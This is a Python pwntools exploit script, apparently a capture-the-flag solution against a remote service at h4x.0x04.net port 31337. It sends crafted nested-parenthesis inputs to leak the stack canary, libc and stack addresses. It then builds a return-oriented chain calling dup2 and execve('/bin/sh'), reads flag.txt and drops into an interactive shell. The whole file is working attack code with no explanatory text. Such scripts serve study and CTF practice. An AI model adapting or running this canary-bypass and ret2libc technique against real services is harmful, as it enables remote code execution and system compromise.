from pwn import *

def connect():
    with context.local(log_level='error'):
        c = remote("h4x.0x04.net", 31337)
    return c

def leak_n(n):
    with context.local(log_level='error'):
        c = connect()
        c.sendline(n*"(" + "+" + n*")")
        value = c.readline()
        value = u32(p32(int(value), sign=True))
        c.close()
    return value

def leak_canary():
    return leak_n(31)

def leak_libc():
    return leak_n(51)

def leak_stack():
    stack = []
    for x in xrange(0, 5):
        value = leak_n(32+x)
        stack.append(value)
    return stack

def generate_payload(stack):
    payload = 19*"("
    first = True
    for address in stack[::-1]:
        payload += "("*26 + address + 26*")"
        if first:
            payload += "+"
            first = False
        else:
            payload += ")+"
    payload = payload[:-1]
    return payload


if __name__ == "__main__":
    p = log.progress("LEAKING")

    with context.local(log_level='error'):
        libc = ELF("./libc.so")
    canary = leak_canary()

    libc_func = leak_libc()
    libc_start = libc_func - 243 - libc.symbols['__libc_start_main']

    stack = leak_stack()

    binsh = libc_start + 1439057
    execve = libc_start + libc.symbols['execve']
    ret_addr = stack[3]

    pop2 = ret_addr + 124
    dup = libc_start + libc.symbols['dup2']

    p.success("Done")

    print("")
    log.info("CANARY: " + hex(canary))
    log.info("LIBC: " + hex(libc_start))

    log.info("DUP: " + hex(dup))
    log.info("POP; POP; RET: " + hex(pop2))

    log.info("EXECVE: " + hex(execve))
    log.info("BINSH: " + hex(binsh))
    print("")

    p = log.progress("PAYLOAD")
    stack = [
        # Canaries
        str(int(canary)),
        str(int(canary)),
        str(int(canary)),
        str(int(canary)),
        str(int(canary)),
        str(int(canary)),

        # dup(4, 0)
        str(int(dup)),
        str(int(pop2)),
        "4",
        "0",

        # dup(4, 1)
        str(int(dup)),
        str(int(pop2)),
        "4",
        "1",

        # execve("/bin/sh", 0, 0)
        str(int(execve)),
        str(int(ret_addr)),
        str(int(binsh)),
        "0",
        "0",
        "0"
    ]
    payload = generate_payload(stack)
    log.info(payload)
    p.success()

    print("")

    # Shell
    with context.local(log_level='error'):
        c = connect()
        c.sendline(payload)
        c.read()
        c.sendline("cat flag.txt")
        print("FLAG: " + c.readline())
        c.interactive()
        c.close()

